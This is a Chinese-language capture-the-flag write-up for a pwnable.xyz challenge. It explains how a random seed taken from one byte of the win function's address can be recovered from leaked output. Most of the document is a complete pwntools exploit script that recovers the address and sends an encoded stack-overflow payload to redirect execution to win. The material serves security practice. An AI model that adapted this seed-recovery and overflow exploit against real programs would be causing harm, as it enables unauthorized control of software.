### 分类

- 逻辑
- 伪随机数



### 描述

随机种子是用win函数地址随机8个字节之一，也就是0~255，范围很小；而且程序里提供了暴露当前随机数的手段，可以通过随机数反推随机种子是多少，进而得到win函数地址；最后就是ret2win了



### 脚本

```python
from pwn import *
from ctypes import *

context.terminal = ['tmux', 'splitw', '-h']

libc = CDLL("libc.so.6")

candidates = []
for i in range(256):
    libc.srand(i)
    x = [libc.rand() & 0xff for _ in range(200)]
    candidates.append(x)

p = remote('svc.pwnable.xyz', 30040)
# p = process('./challenge')

p.sendafter(b'> ', b'1')

def findSeed():
    idx = 0
    list = [i for i in range(256)]
    while len(list) != 1 and list != [0, 1]:
        print('candidates count:', len(list), list)
        p.sendafter(b'> ', b'2')
        p.sendafter(b'plaintext: ', p16(0xff01) + b'\x00')
        p.sendafter(b'> ', b'3')
        p.recvuntil(b'ciphertext: ')
        line = p.recvuntil(b'Menu:')[:-6]
        rnd = line[0]
        rnd2 = line[1]
        tmp = []
        for i in list:
            if (candidates[i][idx] + 1) & 0xff == rnd and (candidates[i][idx] + 0xff) & 0xff == rnd2:
                tmp.append(i)
        list = tmp
        idx += 1
    return idx, list[0]


info('find seed...')
ix, seed = findSeed()

info('find win address...')
mask = 0
win_addr = 0
while mask != (1 << 6)-1:
    rnd = candidates[seed][ix]

    bit = rnd & 7
    if bit < 6 and (1 << bit) | mask != mask:
        p.sendafter(b'> ', b'1')
        ix, seed = findSeed()
        mask |= 1 << bit
        win_addr |= seed << (bit * 8)
        print('win address--->:', bit, hex(win_addr))
    else:
        p.sendafter(b'> ', b'2')
        p.sendafter(b'plaintext: ', p16(0xff01) + b'\x00')
        ix += 1
info('win address:' + hex(win_addr))

info('overflow...')
rnd = candidates[seed][ix]
origin_payload = b'a' * 0x98 + p64(win_addr)
payload = b''
for i in origin_payload:
    if i == 0:
        payload += b'\x00'
        break
    payload += p8(c_uint8(i - c_uint8(rnd).value).value)
print('payload', payload, hex(len(payload)))
p.sendafter(b'> ', b'2')
p.sendafter(b'text: ', payload)

# gdb.attach(p)
p.sendafter(b'> ', b'0')
p.interactive()

```

